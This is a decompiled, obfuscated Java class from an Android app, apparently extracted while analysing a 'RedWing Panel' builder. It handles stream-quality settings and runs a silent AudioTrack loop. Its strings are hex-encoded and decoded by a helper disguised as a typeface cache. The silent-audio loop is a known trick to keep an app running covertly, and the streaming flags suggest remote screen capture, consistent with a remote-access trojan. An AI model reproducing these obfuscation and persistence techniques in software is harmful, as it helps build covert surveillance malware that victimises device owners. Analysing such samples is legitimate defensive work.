package v.s;

import android.media.AudioTrack;
import android.os.Process;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class eY3e7LNeKcWCerE2VMV implements Runnable {
    public final /* synthetic */ int JXn4Qf7zpnLjP5;
    public final /* synthetic */ Object vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ eY3e7LNeKcWCerE2VMV(int i, AudioTrack audioTrack) {
        this.w9sT1Swbhx3hs = 3;
        this.JXn4Qf7zpnLjP5 = i;
        this.vekpFI4d1Nc4fakF = audioTrack;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw = (RWY6BVSB0XxPbw) this.vekpFI4d1Nc4fakF;
                int i = this.JXn4Qf7zpnLjP5;
                if (!rWY6BVSB0XxPbw.qfTrc75xwRVMl85vh(i)) {
                    TypefaceCache.obtain("00300062005A009500E4008C00C600B5002600770056008E00FE00B8008800E7000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E700360078005A009100F100B600DE00A60021007A005E00CB00B000AA00C100AE002D0071001B00A600F300BC00D700B40030007F0059008E00FC00B600C600BE");
                    GARjgaGEpTotOxcl8vfe gARjgaGEpTotOxcl8vfe = DataQFAdapter.Companion;
                    int iDDIMxZXP1V8HdM = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM();
                    if (i <= iDDIMxZXP1V8HdM) {
                        iDDIMxZXP1V8HdM = i;
                    }
                    gARjgaGEpTotOxcl8vfe.getClass();
                    DataQFAdapter.streamQuality = iDDIMxZXP1V8HdM;
                    DataQFAdapter.useH264 = false;
                    int iDDIMxZXP1V8HdM2 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM();
                    if (i > iDDIMxZXP1V8HdM2) {
                        i = iDDIMxZXP1V8HdM2;
                    }
                    rWY6BVSB0XxPbw.vIJudZvPyTuNp(i);
                } else {
                    rWY6BVSB0XxPbw.tne6mXOUFKdd();
                }
                break;
            case 1:
                ((RWY6BVSB0XxPbw) this.vekpFI4d1Nc4fakF).iUQk66nAiXgO35(this.JXn4Qf7zpnLjP5);
                break;
            case 2:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw2 = (RWY6BVSB0XxPbw) this.vekpFI4d1Nc4fakF;
                int i2 = this.JXn4Qf7zpnLjP5;
                if (rWY6BVSB0XxPbw2.xDyLpEZyrcKVe0 && rWY6BVSB0XxPbw2.gmNWMfvn6zlEj) {
                    rWY6BVSB0XxPbw2.iUQk66nAiXgO35(i2);
                    break;
                }
                break;
            default:
                int i3 = this.JXn4Qf7zpnLjP5;
                AudioTrack audioTrack = (AudioTrack) this.vekpFI4d1Nc4fakF;
                Process.setThreadPriority(10);
                byte[] bArr = new byte[i3];
                try {
                    audioTrack.play();
                    while (kExylgSxUDTVQOx3o0oq.vekpFI4d1Nc4fakF) {
                        try {
                            audioTrack.write(bArr, 0, i3);
                        } catch (Exception e) {
                            TypefaceCache.obtain("00020063005F008E00FF008B00C000A60020007D001B009000E200B600C600A2006300730049009500FF00AD008800E7");
                            e.getMessage();
                        }
                    }
                    try {
                        audioTrack.stop();
                        audioTrack.release();
                    } catch (Exception unused) {
                        return;
                    }
                } catch (Exception e2) {
                    TypefaceCache.obtain("00020063005F008E00FF008B00C000A60020007D001B009700FC00BE00CB00E7002600640049008800E200E50092");
                    e2.getMessage();
                }
                break;
        }
    }

    public /* synthetic */ eY3e7LNeKcWCerE2VMV(RWY6BVSB0XxPbw rWY6BVSB0XxPbw, int i, int i2) {
        this.w9sT1Swbhx3hs = i2;
        this.vekpFI4d1Nc4fakF = rWY6BVSB0XxPbw;
        this.JXn4Qf7zpnLjP5 = i;
    }
}
